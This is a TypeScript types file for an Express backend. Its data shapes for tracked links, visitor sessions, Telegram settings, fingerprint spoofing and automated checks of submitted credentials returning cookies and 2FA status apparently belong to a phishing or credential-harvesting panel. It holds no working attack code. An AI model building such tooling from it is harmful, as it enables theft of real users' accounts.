export interface User {
    id: string;
    username: string;
    password?: string;
    role: 'admin' | 'hypervisor';
    uniqueCode: string;
    settings?: string;
    telegramConfig?: string;
    maxLinks?: number;
    maxSessions?: number;
    allowedFlows?: string; // JSON string array
    credits?: number;
    subscriptionTier?: 'free' | 'pro' | 'enterprise';
    permissions?: string; // JSON string
    isSuspended?: boolean;
}

export interface Session {
    id: string;
    data: string;
    lastSeen: number;
    ip?: string;
    adminId?: string;
    variant?: string;
}

export interface SessionWithData {
    id: string;
    lastSeen: number;
    ip?: string;
    adminId?: string;
    variant?: string;
    [key: string]: unknown; // Allow parsed data properties
}

export interface AdminLink {
    code: string;
    adminId: string;
    clicks: number;
    sessions_started: number;
    sessions_verified: number;
    created_at: number;
    flow_config: Record<string, unknown>;
    theme_config: Record<string, unknown>;
    ab_config: Record<string, unknown>;
    traffic_config?: string | Record<string, unknown>; // JSON string or object
    geo_config?: string | Record<string, unknown>;
    approval_config?: string | Record<string, unknown>;
}

export interface Command {
    sessionId: string;
    action: string;
    payload: Record<string, unknown>;
}

export interface Settings {
    [key: string]: string;
}

export interface AuditLog {
    id?: number;
    timestamp: number;
    actor: string;
    action: string;
    details: string;
}

export interface RefreshToken {
    id: string;
    user_id: string;
    token_hash: string;
    expires_at: number;
    created_at: number;
    ip_address?: string;
    user_agent?: string;
    is_revoked: boolean;
}

export interface SessionNote {
    id?: number;
    sessionId: string;
    content: string;
    author: string;
    timestamp: number;

}


export interface TokenPayload {
    id: string;
    username: string;
    role: 'admin' | 'hypervisor';
    iat?: number;
    exp?: number;
}

export interface RefreshTokenPayload {
    userId: string;
    tokenId: string;
    type: 'refresh';
    iat?: number;
    exp?: number;
}

import { Request } from 'express';

export interface RequestWithUser extends Request {
    user?: TokenPayload;
}

export interface AutomationResult {
    status: 'valid' | 'invalid' | '2fa_required' | 'error' | 'timeout';
    screenshot?: string; // Base64
    details?: string;
    cookies?: any[];
}

export interface AutomationRequest {
    flowId: string;
    credentials: Record<string, string>;
    fingerprint?: {
        userAgent: string;
        locale: string;
        timezone: string;
        viewport: { width: number, height: number };
    };
    userId: string; // admin ID
    sessionId: string;
}

export type AutomationCredentials = Record<string, string>;
